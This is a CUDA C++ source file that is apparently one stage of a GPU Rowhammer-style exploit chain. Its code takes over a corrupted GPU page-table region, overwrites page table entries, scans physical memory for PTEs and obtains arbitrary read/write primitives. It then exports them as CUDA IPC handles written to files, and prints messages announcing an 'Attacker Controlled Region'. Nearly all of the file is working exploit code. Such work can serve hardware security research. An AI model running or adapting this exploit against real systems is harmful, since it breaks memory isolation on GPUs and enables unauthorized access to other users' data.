#include "sc_firstRegion_hammer.cuh"
#include "sc_secondRegion.cuh"
#include <chrono>
#include <thread>
#include <fstream>

struct CudaSharedMemHandles {
    size_t pt_ofs;

    cudaIpcMemHandle_t pt_handle;
    cudaIpcMemHandle_t arb_handle;
}__attribute__((__packed__));

bool
second_PT_region (uint64_t num_alloc_init, uint64_t num_alloc_post_msg,
                  double threshold, uint64_t skip, GPUBreachContext &ctx)
{
  uint8_t *temp;
  if (!first_PT_region_attack (num_alloc_init, num_alloc_post_msg, threshold,
                               skip, ctx))
    {
      printf ("Error: First PTC Allocation is wrong\n");
      exit (1);
    }

  auto& region_ptrs = ctx.step3_data.region_ptrs;
  auto& agg_ptrs = ctx.step3_data.agg_ptrs;
  auto& corrupted_ptr = ctx.step3_data.corrupted_ptr;
  auto& victim_ptr = ctx.step3_data.victim_ptr;
  auto& corrupted_id = ctx.step3_data.corrupted_id;
  auto& victim_id = ctx.step3_data.victim_id;
  ctx.step4_data.corrupted_ptr = corrupted_ptr;

  std::cout << corrupted_id << " " << victim_id << '\n';
  std::cout << "Ready to Start Second PTC Test " << '\n';
  pause ();

  uint64_t ERR_next_id = std::numeric_limits<uint64_t>::max ();
  uint64_t next_id = ERR_next_id;
  std::vector<uint8_t *> misc_ptrs;
  for (uint64_t i = 0; i < num_alloc_init; i += 1)
    {
      // Create free space for Page Table Region
      if (i == next_id)
        evict_from_device (region_ptrs[victim_id], ALLOC_SIZE);

      cudaMallocManaged (&temp, ALLOC_SIZE + 4096);

      double currentMS = time_data_access (temp + ALLOC_SIZE, 1);
      DBG_OUT << i << " New PT time: " << currentMS << " ms"<< std::endl;

      misc_ptrs.push_back(temp);

      if (i < skip || i % 511 == 0)
        continue;

      if (i == next_id)
        break;
      if (currentMS > threshold && next_id == ERR_next_id)
        next_id = i + 508;
    }

  for (auto ptr : agg_ptrs)
    cudaFree(ptr);

  std::vector<uint8_t*> fourkb_pages;
  for (uint64_t i = 0; i < (((uint64_t)corrupted_ptr % (2L * 1024 * 1024)) / 4096) + 1; i += 1)
    {
      cudaMallocManaged (&temp, ALLOC_SIZE + 4096);

      double currentMS = time_data_access (temp + ALLOC_SIZE, 1);
      fourkb_pages.push_back(temp);
      std::cout << i << " New PT time: " << currentMS << " ms" << std::endl;
    }
  for (uint64_t i = 0; i < num_alloc_post_msg; i += 1)
  {
    if (i != corrupted_id)
      cudaFree(region_ptrs[i]);
    gpuErrchk(cudaPeekAtLastError());
  }
  for (uint64_t i = 0; i < misc_ptrs.size(); i += 1)
  {
    cudaFree(misc_ptrs[i]);
    gpuErrchk(cudaPeekAtLastError());
  }

  std::vector<void*> &cudaMalloced_ptrs = ctx.step4_data.cudaMalloced_ptrs;
  cudaMalloced_ptrs.reserve(500);
  for (uint64_t i = 0; i < 500; i += 1)
    {
      cudaMalloc(&cudaMalloced_ptrs[i], ALLOC_SIZE);
      memset_ptr<<<1,1>>>((uint8_t*)cudaMalloced_ptrs[i], (uint64_t)cudaMalloced_ptrs[i], 8);
    }
  for (auto& ptr : fourkb_pages)
    cudaFree(ptr);

  print_memory<<<1,1>>>(corrupted_ptr, 64 * 1024);
  cudaDeviceSynchronize();

  std::cout << "(Step 4 Success) Second PT Region Now in Attacker Controlled "
               "Region. We printed out the PTEs of the controlled page and provided "
               "relevant pointers to interact with them in struct S4_ExploitComplete.\n"
               "Those looking like '1 0 76 3 0 0 0 6' are 2MB cudaMalloc PTEs, while '1 55 b4 59 0 0 0 6' "
               "means they are the 4KB PTEs.\n"
               "Press \033[1;32mEnter Key\033[0m to continue..."
            << '\n';
  pause();

  std::cout << (void*)(temp + ALLOC_SIZE) << '\n';
  pause();
  /*****************/
  char * flush_ptr;
  uint8_t *data_device_ptr;
  uint64_t flush_size = 3L * 1024 * 1024 * 1024;
  cudaMallocManaged(&flush_ptr, flush_size);
  cudaMallocManaged(&data_device_ptr, 2L * 1024 * 1024);

  initialize_memory_loop<<<1,1>>>((uint8_t*)flush_ptr, flush_size);
  cudaDeviceSynchronize();
  gpuErrchk(cudaPeekAtLastError());

  // Generate 64KB Pages
  gen_64KB(flush_ptr, flush_size);

  // Flush
  simple_flush<<<1,1>>>(flush_ptr, flush_size);
  cudaDeviceSynchronize();
  gpuErrchk(cudaPeekAtLastError());

  std::cout << "ok"
            << '\n';
  // find virtual address of the 4KB frame

  uint64_t arb_rw_ofs;
  void* arb_rw_orig_ptr = nullptr;
  void* arb_rw_ptr = nullptr;
  void* pt_rw_orig_ptr = nullptr;

  // cudaMemcpyArray(corrupted_ptr + 0xc100, data_device_ptr, 8);
  cudaMemcpyArray(data_device_ptr, corrupted_ptr + 0xc100, 8);
  arb_rw_orig_ptr = *(void**)data_device_ptr;

  cudaMemcpyArray(data_device_ptr, corrupted_ptr + 0xc110, 8);
  pt_rw_orig_ptr = *(void**)data_device_ptr;

  memset_ptr<<<1,1>>>(corrupted_ptr + 0xc100, (uint64_t)(0x60000000000001), 8);
  simple_flush<<<1,1>>>(flush_ptr, flush_size);
  cudaDeviceSynchronize();
  gpuErrchk(cudaPeekAtLastError());
  
  for (int j = 0; j < cudaMalloced_ptrs.size(); j++)
  {
    cudaMemcpyArray(data_device_ptr, (uint8_t*)cudaMalloced_ptrs[j], 8);
    if (*(void**)data_device_ptr !=  (void *)cudaMalloced_ptrs[j])
    {
      std::cout << "Arb:" << (void *)cudaMalloced_ptrs[j] << ' ' << *(void**)data_device_ptr << ' ' << j << '\n';
      arb_rw_ptr = (void *)cudaMalloced_ptrs[j];
      arb_rw_ofs = j;
      break;
    }
  }

  std::cout << "ok" << '\n';
  pause();
  // find physical location of pointer_to_find
  uint64_t it_ptr = (uint64_t)(0x60000000000001);
  uint64_t target_pte_ofs = ((uint64_t)corrupted_ptr + 0xc100) % (2L * 1024 * 1024);
  for (uint64_t i = 0; i < (uint64_t)23L * 1024 * 1024 * 1024; i += ALLOC_SIZE)
    {
      if (i > (uint64_t)12L * 1024 * 1024 * 1024)
      {
        // gen_64KB(flush_ptr, flush_size);
        
        memset_ptr<<<1,1>>>(corrupted_ptr + 0xc100, it_ptr, 8);
        cudaDeviceSynchronize();
        simple_flush<<<1,1>>>(flush_ptr, flush_size);
        cudaDeviceSynchronize();
        cudaMemcpyArray(data_device_ptr, (uint8_t*)arb_rw_ptr + target_pte_ofs, 8);
        // cudaMemcpy(&value_of_pointer, (uint8_t*)arb_rw_ptr + ((uint64_t)corrupted_ptr + 0xc100) % (2L * 1024 * 1024), 8, cudaMemcpyDeviceToHost);
        std::cout << (void*)it_ptr << ' ' << *(void**)data_device_ptr << '\n';
        if (*(void**)data_device_ptr == (void*)it_ptr)
        {
          std::cout << *(void**)data_device_ptr << '\n';
          break;
        }
        cudaDeviceSynchronize();
        gpuErrchk(cudaPeekAtLastError());

        
      }
      it_ptr += 0x20000;
    }
  pause();
  uint64_t pt_entry_phys = it_ptr;
  void* pt_rw_ptr = nullptr;
  uint64_t pt_rw_ofs;
  // Set another cudaMalloc to this:
  memset_ptr<<<1,1>>>(corrupted_ptr + 0xc110, pt_entry_phys, 8);
  cudaDeviceSynchronize();
  simple_flush<<<1,1>>>(flush_ptr, flush_size);
  cudaDeviceSynchronize();

  for (int j = 0; j < cudaMalloced_ptrs.size(); j++)
  {
    cudaMemcpyArray(data_device_ptr, (uint8_t*)cudaMalloced_ptrs[j], 8);
    if ((void *)cudaMalloced_ptrs[j] != arb_rw_ptr && *(void**)data_device_ptr !=  (void *)cudaMalloced_ptrs[j])
    {
      std::cout << "PT rw:" << (void *)cudaMalloced_ptrs[j] << ' ' << *(void**)data_device_ptr << ' ' << j << '\n';
      pt_rw_ptr = (void *)cudaMalloced_ptrs[j];
      pt_rw_ofs = j;
      break;
    }
  }

  CudaSharedMemHandles data;

  data.pt_ofs = target_pte_ofs;

  cudaIpcGetMemHandle(&data.pt_handle, pt_rw_ptr);
  cudaIpcGetMemHandle(&data.arb_handle, arb_rw_ptr);

  std::ofstream file("cuda_ipc_handles.bin", std::ios::binary);
  file.write(reinterpret_cast<char*>(&data), sizeof(data));
  file.close();

  cudaMemcpyArray(data_device_ptr, (uint8_t*)pt_rw_ptr + data.pt_ofs, 8);
  std::cout << "PT rw:" << *(void**)data_device_ptr <<  " Orig: "<< pt_rw_orig_ptr << '\n';
  cudaMemcpyArray(data_device_ptr, (uint8_t*)arb_rw_ptr, 8);
  std::cout << "Arbitrary rw:" << *(void**)data_device_ptr << " Orig: "<< arb_rw_orig_ptr << '\n';

  std::cout << "Wrote CUDA IPC handles to file\n";
  pause();

  // find orig pte entries:
  //   for pt, make it the arb's physical location + offset
  uint64_t arb_location = 0;
  uint64_t pt_location = 0;
  uint64_t arb_location_ofs = 0;
  uint64_t pt_location_ofs = 0;
  it_ptr = (uint64_t)(0x60000000000001);
  for (uint64_t i = 0; i < (uint64_t)23L * 1024 * 1024 * 1024; i += ALLOC_SIZE)
    {
      if (i > (uint64_t)12L * 1024 * 1024 * 1024)
      {
        memset_ptr<<<1,1>>>((uint8_t *)pt_rw_ptr + data.pt_ofs, it_ptr, 8);
        cudaDeviceSynchronize();
        simple_flush<<<1,1>>>(flush_ptr, flush_size);
        cudaDeviceSynchronize();

        cudaMemcpyArray(data_device_ptr, (uint8_t*)arb_rw_ptr, 2L * 1024 * 1024);
        std::cout << (void*)it_ptr << ' ' << *(void**)data_device_ptr << '\n';
        for (int z = 0; z < 2L * 1024 * 1024; z+=8)
        {
          if (*(void**)(data_device_ptr + z) == arb_rw_orig_ptr)
          {
            arb_location = it_ptr;
            arb_location_ofs = z;
            std::cout << "Found" << '\n';
          }
          if (*(void**)(data_device_ptr + z) == pt_rw_orig_ptr)
          {
            pt_location = it_ptr;
            pt_location_ofs = z;
            std::cout << "Found" << '\n';
          }
        }
        
        if (arb_location != 0 && pt_location != 0)
        {
          break;
        }
        cudaDeviceSynchronize();
        gpuErrchk(cudaPeekAtLastError());   
      }
      it_ptr += 0x20000;
    }
  pause();

  // set new pt rw ptr to the PT's 2MB page
  // pass new arb_location offset through file.
  simple_flush<<<1,1>>>(flush_ptr, flush_size);
  cudaDeviceSynchronize();

  memset_ptr<<<1,1>>>((uint8_t *)pt_rw_ptr + data.pt_ofs, pt_location, 8);
  cudaDeviceSynchronize();

  memset_ptr<<<1,1>>>((uint8_t *)arb_rw_ptr + pt_location_ofs, pt_location, 8);
  cudaDeviceSynchronize();

  simple_flush<<<1,1>>>(flush_ptr, flush_size);
  cudaDeviceSynchronize();

  data.pt_ofs = arb_location_ofs;
  std::ofstream new_ofs_file("new_offset.bin", std::ios::binary);
  new_ofs_file.write(reinterpret_cast<char*>(&data), sizeof(data));
  new_ofs_file.close();

  pause();

  return 0;
}

bool
second_PT_region (int argc, char *argv[])
{
  const uint64_t num_alloc_init = std::stoll (argv[0]);
  const uint64_t num_alloc_post_msg = std::stoll (argv[1]);
  const double threshold = std::stod (argv[2]);
  const uint64_t skip = std::stoull (argv[3]);
  GPUBreachContext ctx;

  return second_PT_region (num_alloc_init, num_alloc_post_msg, threshold, skip, ctx);
}
